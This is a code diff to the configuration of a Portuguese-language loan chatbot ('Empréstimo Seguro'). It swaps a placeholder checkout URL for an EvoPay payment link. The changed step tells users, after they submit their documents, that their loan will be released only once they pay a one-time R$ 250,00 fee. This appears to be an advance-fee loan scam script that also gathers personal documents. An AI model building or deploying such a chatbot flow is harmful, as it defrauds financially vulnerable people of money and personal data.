@@ -1,7 +1,7 @@
 // +---------------------------------------------------------------+
-//¦  CONFIGURAÇÃO DO CHATBOT - PEDRO DA SILVA LIMA                ¦
-//¦  Empréstimo Seguro • 2026 • Total Transparência               ¦
-//+---------------------------------------------------------------+
+// |  CONFIGURAÇÃO DO CHATBOT - PEDRO DA SILVA LIMA                |
+// |  Empréstimo Seguro • 2026 • Total Transparência               |
+// +---------------------------------------------------------------+
 
 window.CONFIG = {
   
@@ -95,8 +95,8 @@ Após enviar, digite uma das palavras abaixo para prosseguir:<br>
     
     // Etapa 4: Link do checkout
     checkoutLink(nome) {
-      // ?? Substitua pelo seu link real (ex: Typeform, Google Forms, ou página própria)
-      const link = "https://seu-checkout.com/form?nome=" + encodeURIComponent(nome);
+      // ?? Substitua pelo seu link real do EvoPay
+      const link = "https://app.evopay.cash/checkout/SEU_ID_AQUI";
       return `? Ótimo, ${nome}! Todos os documentos e informações recebidos.<br><br>
 Agora, para liberar seu empréstimo, basta pagar a taxa única de <b>R$ 250,00</b> via checkout seguro:<br><br>
 ?? <a href="${link}" target="_blank"><b>?? ACESSAR CHECKOUT (R$ 250,00)</b></a><br><br>
